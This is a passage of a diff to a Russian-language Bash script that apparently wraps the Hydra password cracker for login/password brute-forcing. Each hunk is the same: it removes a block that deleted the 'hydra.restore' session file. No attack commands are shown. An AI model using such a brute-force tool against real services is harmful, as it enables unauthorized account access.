 MAINBRUTEMENURU
 
@@ -6597,9 +6409,7 @@ echo -e "$red-------------------------------------------------------------------
 echo -e "$aquamarine                       Приступаем к перебору логин/пароль "
 echo -e "$red-------------------------------------------------------------------------------$colorbase"
 
-if [ -e hydra.restore ]; then
-rm -f hydra.restore 2> /dev/null
-fi
+
 
 MAINBRUTEMENURU
 
@@ -6669,9 +6479,7 @@ echo -e "$red-------------------------------------------------------------------
 echo -e "$aquamarine                       Приступаем к перебору логин/пароль "
 echo -e "$red-------------------------------------------------------------------------------$colorbase"
 
-if [ -e hydra.restore ]; then
-rm -f hydra.restore 2> /dev/null
-fi
+
 
 MAINBRUTEMENURU
 
@@ -6741,9 +6549,7 @@ echo -e "$red-------------------------------------------------------------------
 echo -e "$aquamarine                       Приступаем к перебору логин/пароль "
 echo -e "$red-------------------------------------------------------------------------------$colorbase"
 
-if [ -e hydra.restore ]; then
-rm -f hydra.restore 2> /dev/null
-fi
+
 
 MAINBRUTEMENURU
 
@@ -6813,9 +6619,7 @@ echo -e "$red-------------------------------------------------------------------
 echo -e "$aquamarine                       Приступаем к перебору логин/пароль "
 echo -e "$red-------------------------------------------------------------------------------$colorbase"
 
-if [ -e hydra.restore ]; then
-rm -f hydra.restore 2> /dev/null
-fi
+
 
 MAINBRUTEMENURU
 
@@ -6885,9 +6689,7 @@ echo -e "$red-------------------------------------------------------------------
 echo -e "$aquamarine                       Приступаем к перебору логин/пароль "
 echo -e "$red-------------------------------------------------------------------------------$colorbase"
 
-if [ -e hydra.restore ]; then
-rm -f hydra.restore 2> /dev/null
-fi
+
 
 MAINBRUTEMENURU
 
@@ -6957,9 +6759,7 @@ echo -e "$red-------------------------------------------------------------------
 echo -e "$aquamarine                       Приступаем к перебору логин/пароль "
 echo -e "$red-------------------------------------------------------------------------------$colorbase"
 
-if [ -e hydra.restore ]; then
-rm -f hydra.restore 2> /dev/null
-fi
+
 
 MAINBRUTEMENURU
 
@@ -7029,9 +6829,7 @@ echo -e "$red-------------------------------------------------------------------
 echo -e "$aquamarine                       Приступаем к перебору логин/пароль "
 echo -e "$red-------------------------------------------------------------------------------$colorbase"
 
-if [ -e hydra.restore ]; then
-rm -f hydra.restore 2> /dev/null
-fi
+
 
 MAINBRUTEMENURU
 
@@ -7102,9 +6900,7 @@ echo -e "$red-------------------------------------------------------------------
 echo -e "$aquamarine                       Приступаем к перебору логин/пароль "
 echo -e "$red-------------------------------------------------------------------------------$colorbase"
 
-if [ -e hydra.restore ]; then
-rm -f hydra.restore 2> /dev/null
-fi
+
 
 MAINBRUTEMENURU
 else
@@ -7172,9 +6968,7 @@ echo -e "$red-------------------------------------------------------------------
 echo -e "$aquamarine                       Приступаем к перебору логин/пароль "
 echo -e "$red-------------------------------------------------------------------------------$colorbase"
 
-if [ -e hydra.restore ]; then
-rm -f hydra.restore 2> /dev/null
-fi
+
 
 MAINBRUTEMENURU
 
@@ -7243,9 +7037,7 @@ echo -e "$red-------------------------------------------------------------------
 echo -e "$aquamarine                       Приступаем к перебору логин/пароль "
 echo -e "$red-------------------------------------------------------------------------------$colorbase"
 
-if [ -e hydra.restore ]; then
-rm -f hydra.restore 2> /dev/null
-fi
+
 
 MAINBRUTEMENURU
 
@@ -7315,9 +7107,7 @@ echo -e "$red-------------------------------------------------------------------
 echo -e "$aquamarine                       Приступаем к перебору логин/пароль "
 echo -e "$red-------------------------------------------------------------------------------$colorbase"
 
-if [ -e hydra.restore ]; then
-rm -f hydra.restore 2> /dev/null
-fi
+
 
 MAINBRUTEMENURU
 
@@ -7387,9 +7177,7 @@ echo -e "$red-------------------------------------------------------------------
 echo -e "$aquamarine                       Приступаем к перебору логин/пароль "
 echo -e "$red-------------------------------------------------------------------------------$colorbase"
 
-if [ -e hydra.restore ]; then
-rm -f hydra.restore 2> /dev/null
-fi
+
 
 MAINBRUTEMENURU
 
@@ -7459,9 +7247,7 @@ echo -e "$red-------------------------------------------------------------------
 echo -e "$aquamarine                       Приступаем к перебору логин/пароль "
 echo -e "$red-------------------------------------------------------------------------------$colorbase"
 
-if [ -e hydra.restore ]; then
-rm -f hydra.restore 2> /dev/null
-fi
+
 
 MAINBRUTEMENURU
 
@@ -7531,9 +7317,7 @@ echo -e "$red-------------------------------------------------------------------
 echo -e "$aquamarine                       Приступаем к перебору логин/пароль "
 echo -e "$red-------------------------------------------------------------------------------$colorbase"
 
-if [ -e hydra.restore ]; then
-rm -f hydra.restore 2> /dev/null
-fi
+
 
 MAINBRUTEMENURU
 
@@ -7603,9 +7387,7 @@ echo -e "$red-------------------------------------------------------------------
 echo -e "$aquamarine                       Приступаем к перебору логин/пароль "
 echo -e "$red-------------------------------------------------------------------------------$colorbase"
 
-if [ -e hydra.restore ]; then
-rm -f hydra.restore 2> /dev/null
-fi
+
 
 MAINBRUTEMENURU
 
@@ -7675,9 +7457,7 @@ echo -e "$red-------------------------------------------------------------------
 echo -e "$aquamarine                       Приступаем к перебору логин/пароль "
 echo -e "$red-------------------------------------------------------------------------------$colorbase"
 
-if [ -e hydra.restore ]; then
-rm -f hydra.restore 2> /dev/null
-fi
+
 
 MAINBRUTEMENURU
 
@@ -7747,9 +7527,7 @@ echo -e "$red-------------------------------------------------------------------
 echo -e "$aquamarine                       Приступаем к перебору логин/пароль "
 echo -e "$red-------------------------------------------------------------------------------$colorbase"
 
-if [ -e hydra.restore ]; then
-rm -f hydra.restore 2> /dev/null
-fi
+
 
 MAINBRUTEMENURU
 
@@ -7819,9 +7597,7 @@ echo -e "$red-------------------------------------------------------------------
 echo -e "$aquamarine                       Приступаем к перебору логин/пароль "
 echo -e "$red-------------------------------------------------------------------------------$colorbase"
 
-if [ -e hydra.restore ]; then
-rm -f hydra.restore 2> /dev/null
-fi
+
 
 MAINBRUTEMENURU
 
@@ -7891,9 +7667,7 @@ echo -e "$red-------------------------------------------------------------------
 echo -e "$aquamarine                       Приступаем к перебору логин/пароль "
 echo -e "$red-------------------------------------------------------------------------------$colorbase"
 
-if [ -e hydra.restore ]; then
-rm -f hydra.restore 2> /dev/null
-fi
+
 
 MAINBRUTEMENURU
 
@@ -7963,9 +7737,7 @@ echo -e "$red-------------------------------------------------------------------
 echo -e "$aquamarine                       Приступаем к перебору логин/пароль "
 echo -e "$red-------------------------------------------------------------------------------$colorbase"
 
-if [ -e hydra.restore ]; then
-rm -f hydra.restore 2> /dev/null
-fi
+
 
 MAINBRUTEMENURU
 
@@ -8035,9 +7807,7 @@ echo -e "$red-------------------------------------------------------------------
 echo -e "$aquamarine                       Приступаем к перебору логин/пароль "
 echo -e "$red-------------------------------------------------------------------------------$colorbase"
 
-if [ -e hydra.restore ]; then
-rm -f hydra.restore 2> /dev/null
-fi
+
 
 MAINBRUTEMENURU
 
@@ -8107,9 +7877,7 @@ echo -e "$red-------------------------------------------------------------------
 echo -e "$aquamarine                       Приступаем к перебору логин/пароль "
 echo -e "$red-------------------------------------------------------------------------------$colorbase"
 
-if [ -e hydra.restore ]; then
-rm -f hydra.restore 2> /dev/null
-fi
+
 
 MAINBRUTEMENURU
 
@@ -8179,9 +7947,7 @@ echo -e "$red-------------------------------------------------------------------
 echo -e "$aquamarine                       Приступаем к перебору логин/пароль "
 echo -e "$red-------------------------------------------------------------------------------$colorbase"
 
-if [ -e hydra.restore ]; then
-rm -f hydra.restore 2> /dev/null
-fi
+
 
 MAINBRUTEMENURU
 
@@ -8251,9 +8017,7 @@ echo -e "$red-------------------------------------------------------------------
 echo -e "$aquamarine                       Приступаем к перебору логин/пароль "
 echo -e "$red-------------------------------------------------------------------------------$colorbase"
 
-if [ -e hydra.restore ]; then
-rm -f hydra.restore 2> /dev/null
-fi
+
 
 MAINBRUTEMENURU
 
@@ -8323,9 +8087,7 @@ echo -e "$red-------------------------------------------------------------------
 echo -e "$aquamarine                       Приступаем к перебору логин/пароль "
 echo -e "$red-------------------------------------------------------------------------------$colorbase"
 
-if [ -e hydra.restore ]; then
-rm -f hydra.restore 2> /dev/null
-fi
+
 
 MAINBRUTEMENURU
 
@@ -8395,9 +8157,7 @@ echo -e "$red-------------------------------------------------------------------
 echo -e "$aquamarine                       Приступаем к перебору логин/пароль "
 echo -e "$red-------------------------------------------------------------------------------$colorbase"
 
-if [ -e hydra.restore ]; then
-rm -f hydra.restore 2> /dev/null
-fi
+
 
 MAINBRUTEMENURU
 
@@ -8466,9 +8226,7 @@ echo -e "$red-------------------------------------------------------------------
 echo -e "$aquamarine                       Приступаем к перебору логин/пароль "
 echo -e "$red-------------------------------------------------------------------------------$colorbase"
 
-if [ -e hydra.restore ]; then
-rm -f hydra.restore 2> /dev/null
-fi
+
 
 MAINBRUTEMENURU
 
@@ -8538,9 +8296,7 @@ echo -e "$red-------------------------------------------------------------------
 echo -e "$aquamarine                       Приступаем к перебору логин/пароль "
 echo -e "$red-------------------------------------------------------------------------------$colorbase"
 
-if [ -e hydra.restore ]; then
-rm -f hydra.restore 2> /dev/null
-fi
+
 
 MAINBRUTEMENURU
 
@@ -8610,9 +8366,7 @@ echo -e "$red-------------------------------------------------------------------
 echo -e "$aquamarine                       Приступаем к перебору логин/пароль "
 echo -e "$red-------------------------------------------------------------------------------$colorbase"
 
-if [ -e hydra.restore ]; then
-rm -f hydra.restore 2> /dev/null
-fi
+
 
 MAINBRUTEMENURU
 
@@ -8682,9 +8436,7 @@ echo -e "$red-------------------------------------------------------------------
 echo -e "$aquamarine                       Приступаем к перебору логин/пароль "
 echo -e "$red-------------------------------------------------------------------------------$colorbase"
 
-if [ -e hydra.restore ]; then
-rm -f hydra.restore 2> /dev/null
-fi
+
 
 MAINBRUTEMENURU
 
@@ -8754,9 +8506,7 @@ echo -e "$red-------------------------------------------------------------------
 echo -e "$aquamarine                       Приступаем к перебору логин/пароль "
 echo -e "$red-------------------------------------------------------------------------------$colorbase"
 
-if [ -e hydra.restore ]; then
-rm -f hydra.restore 2> /dev/null
-fi
+
 
 MAINBRUTEMENURU
 
@@ -8826,9 +8576,7 @@ echo -e "$red-------------------------------------------------------------------
 echo -e "$aquamarine                       Приступаем к перебору логин/пароль "
 echo -e "$red-------------------------------------------------------------------------------$colorbase"
 
-if [ -e hydra.restore ]; then
-rm -f hydra.restore 2> /dev/null
-fi
+
 
 MAINBRUTEMENURU
 
@@ -8898,9 +8646,7 @@ echo -e "$red-------------------------------------------------------------------
 echo -e "$aquamarine                       Приступаем к перебору логин/пароль "
 echo -e "$red-------------------------------------------------------------------------------$colorbase"
 
-if [ -e hydra.restore ]; then
-rm -f hydra.restore 2> /dev/null
-fi
+
 
 MAINBRUTEMENURU
 
@@ -8969,9 +8715,7 @@ echo -e "$red-------------------------------------------------------------------
 echo -e "$aquamarine                       Приступаем к перебору логин/пароль "
 echo -e "$red-------------------------------------------------------------------------------$colorbase"
 
-if [ -e hydra.restore ]; then
-rm -f hydra.restore 2> /dev/null
-fi
+
 
 MAINBRUTEMENURU
 
@@ -9041,9 +8785,7 @@ echo -e "$red-------------------------------------------------------------------
 echo -e "$aquamarine                       Приступаем к перебору логин/пароль "
 echo -e "$red-------------------------------------------------------------------------------$colorbase"
 
-if [ -e hydra.restore ]; then
-rm -f hydra.restore 2> /dev/null
-fi
+
 
 MAINBRUTEMENURU
 
@@ -9113,9 +8855,7 @@ echo -e "$red-------------------------------------------------------------------
 echo -e "$aquamarine                       Приступаем к перебору логин/пароль "
 echo -e "$red-------------------------------------------------------------------------------$colorbase"
 
-if [ -e hydra.restore ]; then
-rm -f hydra.restore 2> /dev/null
-fi
+
 
 MAINBRUTEMENURU
 
@@ -9185,9 +8925,7 @@ echo -e "$red-------------------------------------------------------------------
 echo -e "$aquamarine                       Приступаем к перебору логин/пароль "
 echo -e "$red-------------------------------------------------------------------------------$colorbase"
 
-if [ -e hydra.restore ]; then
-rm -f hydra.restore 2> /dev/null
-fi
+
 
 MAINBRUTEMENURU
 
@@ -9257,9 +8995,7 @@ echo -e "$red-------------------------------------------------------------------
 echo -e "$aquamarine                       Приступаем к перебору логин/пароль "
 echo -e "$red-------------------------------------------------------------------------------$colorbase"
 
-if [ -e hydra.restore ]; then
-rm -f hydra.restore 2> /dev/null
-fi
+
 
 MAINBRUTEMENURU
 
@@ -9329,9 +9065,7 @@ echo -e "$red-------------------------------------------------------------------
 echo -e "$aquamarine                       Приступаем к перебору логин/пароль "
 echo -e "$red-------------------------------------------------------------------------------$colorbase"
 
-if [ -e hydra.restore ]; then
-rm -f hydra.restore 2> /dev/null
-fi
+
 
 MAINBRUTEMENURU
 
@@ -9401,9 +9135,7 @@ echo -e "$red-------------------------------------------------------------------
 echo -e "$aquamarine                       Приступаем к перебору логин/пароль "
 echo -e "$red-------------------------------------------------------------------------------$colorbase"
 
-if [ -e hydra.restore ]; then
-rm -f hydra.restore 2> /dev/null
-fi
+
 
 MAINBRUTEMENURU
 
@@ -9473,9 +9205,7 @@ echo -e "$red-------------------------------------------------------------------
 echo -e "$aquamarine                       Приступаем к перебору логин/пароль "
 echo -e "$red-------------------------------------------------------------------------------$colorbase"
 
-if [ -e hydra.restore ]; then
-rm -f hydra.restore 2> /dev/null
-fi
+
 
 MAINBRUTEMENURU
 
@@ -9544,9 +9274,7 @@ echo -e "$red-------------------------------------------------------------------
 echo -e "$aquamarine                       Приступаем к перебору логин/пароль "
 echo -e "$red-------------------------------------------------------------------------------$colorbase"
 
-if [ -e hydra.restore ]; then
-rm -f hydra.restore 2> /dev/null
-fi
+
 
 MAINBRUTEMENURU
 
@@ -9616,9 +9344,7 @@ echo -e "$red-------------------------------------------------------------------
 echo -e "$aquamarine                       Приступаем к перебору логин/пароль "
 echo -e "$red-------------------------------------------------------------------------------$colorbase"
 
-if [ -e hydra.restore ]; then
-rm -f hydra.restore 2> /dev/null
-fi
+
 
 MAINBRUTEMENURU
 
@@ -9688,9 +9414,7 @@ echo -e "$red-------------------------------------------------------------------
 echo -e "$aquamarine                       Приступаем к перебору логин/пароль "
 echo -e "$red-------------------------------------------------------------------------------$colorbase"
 
-if [ -e hydra.restore ]; then
-rm -f hydra.restore 2> /dev/null
-fi
+
 
 MAINBRUTEMENURU
 
@@ -9760,9 +9484,7 @@ echo -e "$red-------------------------------------------------------------------
 echo -e "$aquamarine                       Приступаем к перебору логин/пароль "
 echo -e "$red-------------------------------------------------------------------------------$colorbase"
 
-if [ -e hydra.restore ]; then
-rm -f hydra.restore 2> /dev/null
-fi
+
 
 MAINBRUTEMENURU
 
@@ -9832,9 +9554,7 @@ echo -e "$red-------------------------------------------------------------------
 echo -e "$aquamarine                       Приступаем к перебору логин/пароль "
 echo -e "$red-------------------------------------------------------------------------------$colorbase"
 
-if [ -e hydra.restore ]; then
-rm -f hydra.restore 2> /dev/null
-fi
+
 
 MAINBRUTEMENURU
 
@@ -9904,9 +9624,7 @@ echo -e "$red-------------------------------------------------------------------
 echo -e "$aquamarine                       Приступаем к перебору логин/пароль "
 echo -e "$red-------------------------------------------------------------------------------$colorbase"
 
-if [ -e hydra.restore ]; then
-rm -f hydra.restore 2> /dev/null
-fi
+
 
 MAINBRUTEMENURU
 
@@ -9976,9 +9694,7 @@ echo -e "$red-------------------------------------------------------------------
 echo -e "$aquamarine                       Приступаем к перебору логин/пароль "
 echo -e "$red-------------------------------------------------------------------------------$colorbase"
 
-if [ -e hydra.restore ]; then
-rm -f hydra.restore 2> /dev/null
-fi
+
 
 MAINBRUTEMENURU
 
@@ -10048,9 +9764,7 @@ echo -e "$red-------------------------------------------------------------------
 echo -e "$aquamarine                       Приступаем к перебору логин/пароль "
 echo -e "$red-------------------------------------------------------------------------------$colorbase"
 
-if [ -e hydra.restore ]; then
-rm -f hydra.restore 2> /dev/null
-fi
+
 
 MAINBRUTEMENURU
 
@@ -10120,9 +9834,7 @@ echo -e "$red-------------------------------------------------------------------
 echo -e "$aquamarine                       Приступаем к перебору логин/пароль "
 echo -e "$red-------------------------------------------------------------------------------$colorbase"
 
-if [ -e hydra.restore ]; then
-rm -f hydra.restore 2> /dev/null
-fi
+
 
 MAINBRUTEMENURU
 
@@ -10192,9 +9904,7 @@ echo -e "$red-------------------------------------------------------------------
 echo -e "$aquamarine                       Приступаем к перебору логин/пароль "
 echo -e "$red-------------------------------------------------------------------------------$colorbase"
 
-if [ -e hydra.restore ]; then
-rm -f hydra.restore 2> /dev/null
-fi
+
 
 MAINBRUTEMENURU
 
@@ -10264,9 +9974,7 @@ echo -e "$red-------------------------------------------------------------------
 echo -e "$aquamarine                       Приступаем к перебору логин/пароль "
 echo -e "$red-------------------------------------------------------------------------------$colorbase"
 
-if [ -e hydra.restore ]; then
-rm -f hydra.restore 2> /dev/null
-fi
+
 
 MAINBRUTEMENURU
 
@@ -10336,9 +10044,7 @@ echo -e "$red-------------------------------------------------------------------
 echo -e "$aquamarine                       Приступаем к перебору логин/пароль "
 echo -e "$red-------------------------------------------------------------------------------$colorbase"
 
-if [ -e hydra.restore ]; then
-rm -f hydra.restore 2> /dev/null
-fi
+
 
 MAINBRUTEMENURU
 
@@ -10408,9 +10114,7 @@ echo -e "$red-------------------------------------------------------------------
 echo -e "$aquamarine                       Приступаем к перебору логин/пароль "
 echo -e "$red-------------------------------------------------------------------------------$colorbase"
 
-if [ -e hydra.restore ]; then
-rm -f hydra.restore 2> /dev/null
-fi
+
 
 MAINBRUTEMENURU
 
@@ -10480,9 +10184,7 @@ echo -e "$red-------------------------------------------------------------------
 echo -e "$aquamarine                       Приступаем к перебору логин/пароль "
 echo -e "$red-------------------------------------------------------------------------------$colorbase"
 
-if [ -e hydra.restore ]; then
-rm -f hydra.restore 2> /dev/null
-fi
+
 
 MAINBRUTEMENURU
 
@@ -10552,9 +10254,7 @@ echo -e "$red-------------------------------------------------------------------
 echo -e "$aquamarine                       Приступаем к перебору логин/пароль "
 echo -e "$red-------------------------------------------------------------------------------$colorbase"
 
-if [ -e hydra.restore ]; then
-rm -f hydra.restore 2> /dev/null
-fi
+
 
 MAINBRUTEMENURU
 
@@ -10624,9 +10324,7 @@ echo -e "$red-------------------------------------------------------------------
 echo -e "$aquamarine                       Приступаем к перебору логин/пароль "
 echo -e "$red-------------------------------------------------------------------------------$colorbase"
 
-if [ -e hydra.restore ]; then
-rm -f hydra.restore 2> /dev/null
-fi
+
 
 MAINBRUTEMENURU
 else
@@ -10694,9 +10392,7 @@ echo -e "$red-------------------------------------------------------------------
 echo -e "$aquamarine                       Приступаем к перебору логин/пароль "
 echo -e "$red-------------------------------------------------------------------------------$colorbase"
 
-if [ -e hydra.restore ]; then
-rm -f hydra.restore 2> /dev/null
-fi
+
 
 MAINBRUTEMENURU
 
@@ -10766,9 +10462,7 @@ echo -e "$red-------------------------------------------------------------------
 echo -e "$aquamarine                       Приступаем к перебору логин/пароль "
 echo -e "$red-------------------------------------------------------------------------------$colorbase"
 
-if [ -e hydra.restore ]; then
-rm -f hydra.restore 2> /dev/null
-fi
+
 
 MAINBRUTEMENURU
 
@@ -10837,9 +10531,7 @@ echo -e "$red-------------------------------------------------------------------
 echo -e "$aquamarine                       Приступаем к перебору логин/пароль "
 echo -e "$red-------------------------------------------------------------------------------$colorbase"
 
-if [ -e hydra.restore ]; then
-rm -f hydra.restore 2> /dev/null
-fi
+
 
 MAINBRUTEMENURU
 
@@ -10909,9 +10601,7 @@ echo -e "$red-------------------------------------------------------------------
 echo -e "$aquamarine                       Приступаем к перебору логин/пароль "
 echo -e "$red-------------------------------------------------------------------------------$colorbase"
 
-if [ -e hydra.restore ]; then
-rm -f hydra.restore 2> /dev/null
-fi
+
 
 MAINBRUTEMENURU
 
@@ -10981,9 +10671,7 @@ echo -e "$red-------------------------------------------------------------------
 echo -e "$aquamarine                       Приступаем к перебору логин/пароль "
 echo -e "$red-------------------------------------------------------------------------------$colorbase"
 
-if [ -e hydra.restore ]; then
-rm -f hydra.restore 2> /dev/null
-fi
+
 
 MAINBRUTEMENURU
 
@@ -11053,9 +10741,7 @@ echo -e "$red-------------------------------------------------------------------
 echo -e "$aquamarine                       Приступаем к перебору логин/пароль "
 echo -e "$red-------------------------------------------------------------------------------$colorbase"
 
-if [ -e hydra.restore ]; then
-rm -f hydra.restore 2> /dev/null
-fi
+
 
 MAINBRUTEMENURU
 
@@ -11125,9 +10811,7 @@ echo -e "$red-------------------------------------------------------------------
 echo -e "$aquamarine                       Приступаем к перебору логин/пароль "
 echo -e "$red-------------------------------------------------------------------------------$colorbase"
 
-if [ -e hydra.restore ]; then
-rm -f hydra.restore 2> /dev/null
-fi
+
 
 MAINBRUTEMENURU
 
@@ -11197,9 +10881,7 @@ echo -e "$red-------------------------------------------------------------------
 echo -e "$aquamarine                       Приступаем к перебору логин/пароль "
 echo -e "$red-------------------------------------------------------------------------------$colorbase"
 
-if [ -e hydra.restore ]; then
-rm -f hydra.restore 2> /dev/null
-fi
+
 
 MAINBRUTEMENURU
 
@@ -11269,9 +10951,7 @@ echo -e "$red-------------------------------------------------------------------
 echo -e "$aquamarine                       Приступаем к перебору логин/пароль "
 echo -e "$red-------------------------------------------------------------------------------$colorbase"
 
-if [ -e hydra.restore ]; then
-rm -f hydra.restore 2> /dev/null
-fi
+
 
 MAINBRUTEMENURU
 
@@ -11341,9 +11021,7 @@ echo -e "$red-------------------------------------------------------------------
 echo -e "$aquamarine                       Приступаем к перебору логин/пароль "
 echo -e "$red-------------------------------------------------------------------------------$colorbase"
 
-if [ -e hydra.restore ]; then
-rm -f hydra.restore 2> /dev/null
-fi
+
 
 MAINBRUTEMENURU
 
@@ -11413,9 +11091,7 @@ echo -e "$red-------------------------------------------------------------------
 echo -e "$aquamarine                       Приступаем к перебору логин/пароль "
 echo -e "$red-------------------------------------------------------------------------------$colorbase"
 
-if [ -e hydra.restore ]; then
-rm -f hydra.restore 2> /dev/null
-fi
+
 
 MAINBRUTEMENURU
 
@@ -11485,9 +11161,7 @@ echo -e "$red-------------------------------------------------------------------
 echo -e "$aquamarine                       Приступаем к перебору логин/пароль "
 echo -e "$red-------------------------------------------------------------------------------$colorbase"
 
-if [ -e hydra.restore ]; then
-rm -f hydra.restore 2> /dev/null
-fi
+
 
 MAINBRUTEMENURU
 
@@ -11557,9 +11231,7 @@ echo -e "$red-------------------------------------------------------------------
 echo -e "$aquamarine                       Приступаем к перебору логин/пароль "
 echo -e "$red-------------------------------------------------------------------------------$colorbase"
 
-if [ -e hydra.restore ]; then
-rm -f hydra.restore 2> /dev/null
-fi
+
 
 MAINBRUTEMENURU
 
@@ -11629,9 +11301,7 @@ echo -e "$red-------------------------------------------------------------------
 echo -e "$aquamarine                       Приступаем к перебору логин/пароль "
 echo -e "$red-------------------------------------------------------------------------------$colorbase"
 
-if [ -e hydra.restore ]; then
-rm -f hydra.restore 2> /dev/null
-fi
+
 
 MAINBRUTEMENURU
 
@@ -11701,9 +11371,7 @@ echo -e "$red-------------------------------------------------------------------
 echo -e "$aquamarine                       Приступаем к перебору логин/пароль "
 echo -e "$red-------------------------------------------------------------------------------$colorbase"
 
-if [ -e hydra.restore ]; then
-rm -f hydra.restore 2> /dev/null
-fi
+
 
 MAINBRUTEMENURU
 
@@ -11773,9 +11441,7 @@ echo -e "$red-------------------------------------------------------------------
 echo -e "$aquamarine                       Приступаем к перебору логин/пароль "
 echo -e "$red-------------------------------------------------------------------------------$colorbase"
 
-if [ -e hydra.restore ]; then
-rm -f hydra.restore 2> /dev/null
-fi
+
 
 MAINBRUTEMENURU
 
@@ -11845,9 +11511,7 @@ echo -e "$red-------------------------------------------------------------------
 echo -e "$aquamarine                       Приступаем к перебору логин/пароль "
 echo -e "$red-------------------------------------------------------------------------------$colorbase"
 
-if [ -e hydra.restore ]; then
-rm -f hydra.restore 2> /dev/null
-fi
+
 
 MAINBRUTEMENURU
 
@@ -11917,9 +11581,7 @@ echo -e "$red-------------------------------------------------------------------
 echo -e "$aquamarine                       Приступаем к перебору логин/пароль "
 echo -e "$red-------------------------------------------------------------------------------$colorbase"
 
-if [ -e hydra.restore ]; then
-rm -f hydra.restore 2> /dev/null
-fi
+
 
 MAINBRUTEMENURU
 
@@ -11989,9 +11651,7 @@ echo -e "$red-------------------------------------------------------------------
 echo -e "$aquamarine                       Приступаем к перебору логин/пароль "
 echo -e "$red-------------------------------------------------------------------------------$colorbase"
 
-if [ -e hydra.restore ]; then
-rm -f hydra.restore 2> /dev/null
-fi
+
 
 MAINBRUTEMENURU
 
@@ -12061,9 +11721,7 @@ echo -e "$red-------------------------------------------------------------------
 echo -e "$aquamarine                       Приступаем к перебору логин/пароль "
 echo -e "$red-------------------------------------------------------------------------------$colorbase"
 
-if [ -e hydra.restore ]; then
-rm -f hydra.restore 2> /dev/null
-fi
+
 
 MAINBRUTEMENURU
 
@@ -12133,9 +11791,7 @@ echo -e "$red-------------------------------------------------------------------
 echo -e "$aquamarine                       Приступаем к перебору логин/пароль "
 echo -e "$red-------------------------------------------------------------------------------$colorbase"
 
-if [ -e hydra.restore ]; then
-rm -f hydra.restore 2> /dev/null
-fi
+
 
 MAINBRUTEMENURU
 
@@ -12205,9 +11861,7 @@ echo -e "$red-------------------------------------------------------------------
 echo -e "$aquamarine                       Приступаем к перебору логин/пароль "
 echo -e "$red-------------------------------------------------------------------------------$colorbase"
 
-if [ -e hydra.restore ]; then
-rm -f hydra.restore 2> /dev/null
-fi
+
 
 MAINBRUTEMENURU
 
@@ -12277,9 +11931,7 @@ echo -e "$red-------------------------------------------------------------------
 echo -e "$aquamarine                       Приступаем к перебору логин/пароль "
 echo -e "$red-------------------------------------------------------------------------------$colorbase"
 
-if [ -e hydra.restore ]; then
-rm -f hydra.restore 2> /dev/null
-fi
+
 
 MAINBRUTEMENURU
 
@@ -12349,9 +12001,7 @@ echo -e "$red-------------------------------------------------------------------
 echo -e "$aquamarine                       Приступаем к перебору логин/пароль "
 echo -e "$red-------------------------------------------------------------------------------$colorbase"
 
-if [ -e hydra.restore ]; then
-rm -f hydra.restore 2> /dev/null
-fi
+
 
 MAINBRUTEMENURU
 
@@ -12421,9 +12071,7 @@ echo -e "$red-------------------------------------------------------------------
 echo -e "$aquamarine                       Приступаем к перебору логин/пароль "
 echo -e "$red-------------------------------------------------------------------------------$colorbase"
 
-if [ -e hydra.restore ]; then
-rm -f hydra.restore 2> /dev/null
-fi
+
 
 MAINBRUTEMENURU
 
@@ -12493,9 +12141,7 @@ echo -e "$red-------------------------------------------------------------------
 echo -e "$aquamarine                       Приступаем к перебору логин/пароль "
 echo -e "$red-------------------------------------------------------------------------------$colorbase"
 
-if [ -e hydra.restore ]; then
-rm -f hydra.restore 2> /dev/null
-fi
+
 
 MAINBRUTEMENURU
 else
@@ -12563,9 +12209,7 @@ echo -e "$red-------------------------------------------------------------------
 echo -e "$aquamarine                       Приступаем к перебору логин/пароль "
 echo -e "$red-------------------------------------------------------------------------------$colorbase"
 
-if [ -e hydra.restore ]; then
-rm -f hydra.restore 2> /dev/null
-fi
+
 
 MAINBRUTEMENURU
 
@@ -12634,9 +12278,7 @@ echo -e "$red-------------------------------------------------------------------
 echo -e "$aquamarine                       Приступаем к перебору логин/пароль "
 echo -e "$red-------------------------------------------------------------------------------$colorbase"
 
-if [ -e hydra.restore ]; then
-rm -f hydra.restore 2> /dev/null
-fi
+
 
 MAINBRUTEMENURU
 
@@ -12705,9 +12347,7 @@ echo -e "$red-------------------------------------------------------------------
 echo -e "$aquamarine                       Приступаем к перебору логин/пароль "
 echo -e "$red-------------------------------------------------------------------------------$colorbase"
 
-if [ -e hydra.restore ]; then
-rm -f hydra.restore 2> /dev/null
-fi
+
 
 MAINBRUTEMENURU
 
@@ -12776,9 +12416,7 @@ echo -e "$red-------------------------------------------------------------------
 echo -e "$aquamarine                       Приступаем к перебору логин/пароль "
 echo -e "$red-------------------------------------------------------------------------------$colorbase"
 
-if [ -e hydra.restore ]; then
-rm -f hydra.restore 2> /dev/null
-fi
+
 
 MAINBRUTEMENURU
 
@@ -12847,9 +12485,7 @@ echo -e "$red-------------------------------------------------------------------
 echo -e "$aquamarine                       Приступаем к перебору логин/пароль "
 echo -e "$red-------------------------------------------------------------------------------$colorbase"
 
-if [ -e hydra.restore ]; then
-rm -f hydra.restore 2> /dev/null
-fi
+
 
 MAINBRUTEMENURU
 
@@ -12918,9 +12554,7 @@ echo -e "$red-------------------------------------------------------------------
 echo -e "$aquamarine                       Приступаем к перебору логин/пароль "
 echo -e "$red-------------------------------------------------------------------------------$colorbase"
 
-if [ -e hydra.restore ]; then
-rm -f hydra.restore 2> /dev/null
-fi
+
 
 MAINBRUTEMENURU
 
@@ -12989,9 +12623,7 @@ echo -e "$red-------------------------------------------------------------------
 echo -e "$aquamarine                       Приступаем к перебору логин/пароль "
 echo -e "$red-------------------------------------------------------------------------------$colorbase"
 
-if [ -e hydra.restore ]; then
-rm -f hydra.restore 2> /dev/null
-fi
+
 
 MAINBRUTEMENURU
 
@@ -13060,9 +12692,7 @@ echo -e "$red-------------------------------------------------------------------
 echo -e "$aquamarine                       Приступаем к перебору логин/пароль "
 echo -e "$red-------------------------------------------------------------------------------$colorbase"
 
-if [ -e hydra.restore ]; then
-rm -f hydra.restore 2> /dev/null
-fi
+
 
 MAINBRUTEMENURU
 
@@ -13132,9 +12762,7 @@ echo -e "$red-------------------------------------------------------------------
 echo -e "$aquamarine                       Приступаем к перебору логин/пароль "
 echo -e "$red-------------------------------------------------------------------------------$colorbase"
 
-if [ -e hydra.restore ]; then
-rm -f hydra.restore 2> /dev/null
-fi
+
 
 MAINBRUTEMENURU
 
@@ -13204,9 +12832,7 @@ echo -e "$red-------------------------------------------------------------------
 echo -e "$aquamarine                       Приступаем к перебору логин/пароль "
 echo -e "$red-------------------------------------------------------------------------------$colorbase"
 
-if [ -e hydra.restore ]; then
-rm -f hydra.restore 2> /dev/null
-fi
+
 
 MAINBRUTEMENURU
 
